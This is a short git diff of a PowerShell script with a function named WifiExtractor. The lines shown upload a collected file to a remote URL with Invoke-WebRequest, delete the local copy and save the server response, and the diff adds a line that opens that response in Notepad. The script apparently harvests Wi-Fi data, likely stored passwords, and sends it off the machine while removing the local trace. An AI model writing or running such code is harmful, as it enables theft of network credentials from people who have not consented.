@@ -51,6 +51,7 @@ function WifiExtractor {
 	$res = Invoke-WebRequest -uri $url -Method put -InFile $FinalFileName -ContentType "multipart/form-data";
 	rm $FinalFileName
 	$res.Content | Out-File -FilePath url.txt;
+	notepad url.txt;
 }
 
 WifiExtractor -FileName collector
